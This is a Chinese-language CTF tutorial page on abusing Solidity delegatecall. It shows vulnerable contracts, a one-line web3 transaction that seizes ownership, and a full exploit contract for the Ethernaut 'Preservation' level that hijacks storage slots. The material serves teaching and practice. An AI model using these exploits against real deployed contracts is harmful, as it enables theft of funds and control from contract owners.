# Delegatecall

> There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values.

## 原理

### 三种调用函数

在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 call、delegatecall 和 callcode 三种方式。

#### 调用模型

```
<address>.call(...) returns (bool)
<address>.callcode(...) returns (bool)
<address>.delegatecall(...) returns (bool)
```

这些函数提供了灵活的方式与合约进行交互，并且可以接受任何长度、任何类型的参数，其传入的参数会被填充至 32 字节最后拼接为一个字符串序列，由 EVM 解析执行。

在函数调用的过程中，Solidity 中的内置变量 `msg` 会随着调用的发起而改变，`msg` 保存了调用方的信息包括：调用发起的地址，交易金额，被调用函数字符序列等。

#### 异同点

* call: 调用后内置变量 `msg` 的值会修改为调用者，执行环境为被调用者的运行环境
* delegatecall: 调用后内置变量 `msg` 的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）
* callcode: 调用后内置变量 `msg` 的值会修改为调用者，但执行环境为调用者的运行环境

!!! note
    Warning: "callcode" has been deprecated in favour of "delegatecall"

### Delegatecall 滥用

#### 设计初衷

* 函数原型 `<address>.delegatecall(...) returns (bool)`
* 函数设计的目的是为了使用给定地址的代码，其他信息则使用当前合约（如存储、余额等）
* 某种程度上也是为了代码的复用

#### 威胁分析

参考函数原型，我们知道，delegatecall 调用有 `address` 和 `msg.data` 两个参数

* 若 `msg.data` 可控，则可调用 `address` 处任意函数

```solidity
pragma solidity ^0.4.18;

contract Delegate {

    address public owner;

    function Delegate(address _owner) public {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {

    address public owner;
    Delegate delegate;

    function Delegation(address _delegateAddress) public {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    function() public {
        if(delegate.delegatecall(msg.data)) {
            this;
        }
    }
}
```

对于这个例子，攻击者如何成为 owner 呢？

其实我们只需调用 Delegation 的假 `pwn()` 即可，这样就会触发 Delegation 的 `fallback`，这样 `pwn` 的函数签名哈希就会放在 `msg.data[0:4]` 了，这样就会只需 delegate 的 `pwn()` 把 owner 变成自己，如下所示即可（这就是因为 `msg.data` 可控导致的）

```
contract.sendTransaction({data: web3.sha3("pwn()").slice(0,10)})
```

* 若 `msg.data` 和 `address` 都可控，则可调用任意 `address` 处的任意函数

同理，只不过额外加了 `address` 是可控的这个条件，不再作分析

#### 原因分析

```solidity
pragma solidity ^0.4.23;

contract A {
    address public c;
    address public b;
    
    function test() public returns (address a) {
        a = address(this);
        b = a;
    }
}

contract B {
    address public b;
    address public c;
    
    function withdelegatecall(address testaddress) public {
        testaddress.delegatecall(bytes4(keccak256("test()")));
    }
}
```

来看上面这个例子，假设合约 A 部署后地址为 address_a，合约 B 部署后地址为 address_b，使用 外部账户 C 调用 withdelegatecall(address_a)，address_a 和 address_b 中的 b、c 变量分别是多少？结果如下

address_a 合约中，c = 0，b = 0；address_b 合约中，b = 0，c = address_b

修改的不是 B 合约中的 b 变量，而是修改了 B 合约中的 c 变量

![delegatecall](./figure/delegatecall.png)

sstore 即访存指令，可以看到写入的是 1 号存储位，1号存储位 在 B 合约中即对应变量 c，在 A 合约中则对应变量 b，所以事实上调用 delegatecall 来使用 Storage 变量时依据并不是变量名，而是变量的存储位，这样的话我们就可以达到覆盖相关变量的目的。

## 例子

### Source

[ethernaut](https://ethernaut.openzeppelin.com/) 第 16 题

### Analyse

- 我们调用 Preservation 的 `setFirstTime` 函数实际通过 `delegatecall` 执行了 LibraryContract 的 `setTime` 函数，修改了 slot 1 ，也就是修改了 timeZone1Library 变量
- 这样，我们第一次调用 `setFirstTime` 将 timeZone1Library 变量修改为我们的恶意合约的地址，第二次调用 `setFirstTime` 就可以执行我们的任意代码了

### Exp

```solidity
pragma solidity ^0.4.23;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    
    address instance_address = 0x7cec052e622c0fb68ca3b2e3c899b8bf8b78663c;
    Preservation target = Preservation(instance_address);
    function attack1() {
        target.setFirstTime(uint(address(this)));
    }
    function attack2() {
        target.setFirstTime(uint(0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2));
    }
    function setTime(uint _time) public {
        timeZone1Library = address(_time);
        timeZone2Library = address(_time);
        owner = address(_time);
    }
}
```

先调用 `attack1()` ，再调用 `attack2()` 即可

### Result

![](./figure/result.png)

## 题目

### RealWorld 2018
- 题目名称 Acoraida Monica

### Balsn 2019
- 题目名称 Creativity

### 第五空间 2020
- 题目名称 SafeDelegatecall

### 华为鲲鹏计算 2020
- 题目名称 boxgame

!!! note
    注：题目附件相关内容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 仓库寻找。

